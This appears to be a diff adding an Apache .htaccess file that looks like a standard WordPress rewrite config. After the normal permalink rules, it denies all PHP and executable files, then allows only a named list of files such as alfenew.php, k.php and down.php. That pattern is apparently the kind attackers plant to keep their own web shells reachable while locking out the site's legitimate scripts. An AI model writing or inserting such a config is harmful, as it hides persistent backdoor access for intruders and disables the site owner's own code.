@@ -1,0 +1,16 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php7|php8|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(wp-term.php|wp-ver.php|wp-info.php|upgrade.php|alfenew.php|k.php|k1.php|k2.php|wccy.php|usercyy.php|down.php|down2.php|downzip.php|gh.php|gh3.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
